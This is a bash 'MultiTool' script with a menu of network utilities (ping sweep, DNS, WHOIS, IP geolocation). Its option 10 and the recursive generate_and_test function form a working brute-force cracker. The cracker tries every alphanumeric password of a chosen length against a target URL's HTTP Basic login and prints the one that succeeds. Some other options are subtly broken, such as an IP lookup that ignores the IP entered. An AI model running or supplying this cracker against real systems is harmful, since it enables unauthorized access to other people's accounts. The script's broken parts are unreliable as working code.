#!/bin/bash

# Colors
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
CYAN="\033[36m"
RESET="\033[0m"

# Recursive function for permutations
generate_and_test() {
    local current="$1"
    local length="$2"
    local charset="$3"
    local url="$4"
    local user="$5"

    if [ "$length" -eq 0 ]; then
        echo -ne "${YELLOW}Testing: $current${RESET}\r"
        # Check HTTP status code (200 = Success)
        res=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$current" "$url")
        if [ "$res" == "200" ]; then
            echo -e "\n${GREEN}[SUCCESS] Found Password: $current${RESET}"
            return 0
        fi
        return 1
    fi

    for (( i=0; i<${#charset}; i++ )); do
        generate_and_test "${current}${charset:$i:1}" "$((length - 1))" "$charset" "$url" "$user" && return 0
    done
    return 1
}

clear
echo -e "${CYAN}Starting MultiTool...${RESET}"
sleep 1

while true
do
    clear
    echo -e "${RED}███╗   ███╗██╗   ██╗██╗  ████████╗██╗"
    echo "████╗ ████║██║   ██║██║  ╚══██╔══╝██║"
    echo "██╔████╔██║██║   ██║██║     ██║   ██║"
    echo "██║╚██╔╝██║██║   ██║██║     ██║   ██║"
    echo "██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║"
    echo "╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝${RESET}"

    echo -e "${YELLOW}========= MULTITOOL MENU =========${RESET}"
    echo -e "${GREEN}[1] IP Scanner          [2] DNS Lookup"
    echo -e "[3] Ping Test           [4] System Info"
    echo -e "[5] URL Safety Checker  [6] WHOIS + DNS"
    echo -e "[7] Pass Strength Check [8] IP + Geo Info"
    echo -e "[9] IP Details/Analyzer [10] Web Brute Force (Permutations)"
    echo -e "[0] Exit${RESET}\n"

    read -p "Select option > " choice

    case $choice in
        1)
            read -p "Enter base IP (example 192.168.1): " baseip
            echo "Scanning 1-20..."
            for i in {1..20}; do
                ping -c 1 -W 1 $baseip.$i > /dev/null 2>&1 && \
                echo -e "${GREEN}$baseip.$i is UP${RESET}" || echo -e "${RED}$baseip.$i is DOWN${RESET}"
            done
            ;;
        2)
            read -p "Enter domain: " domain
            nslookup $domain
            ;;
        3)
            read -p "Enter host: " host
            ping -c 4 $host
            ;;
        4)
            uname -a && hostname -I
            ;;
        5)
            read -p "Enter URL: " url
            [[ $url == http://* ]] && echo "⚠️ Unsecured HTTP"
            [[ $url =~ @ ]] && echo "⚠️ Phishing risk (@)"
            ;;
        6)
            read -p "Enter domain: " d
            whois $d | head -n 15
            ;;
        7)
            read -s -p "Enter pass: " p
            echo -e "\nLength: ${#p} chars"
            ;;
        8)
            curl -s "http://ip-api.com" | sed 's/[{}"]//g' | tr ',' '\n'
            ;;
        9)
            read -p "Enter IP to analyze: " ip_ana
            curl -s "https://ipapi.co"
            ;;
        10)
            echo -e "${CYAN}--- Brute Force Permutations ---${RESET}"
            read -p "Target URL: " b_url
            read -p "Username: " b_user
            read -p "Min Length: " min_l
            read -p "Max Length: " max_l
            charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            
            for (( l=$min_l; l<=$max_l; l++ )); do
                echo -e "${YELLOW}Testing length: $l...${RESET}"
                generate_and_test "" "$l" "$charset" "$b_url" "$b_user" && break
            done
            ;;
        0)
            echo -e "${RED}Exiting...${RESET}"
            exit 0
            ;;
        *)
            echo "Invalid choice."
            ;;
    esac
    echo
    read -p "Press Enter to continue..."
done
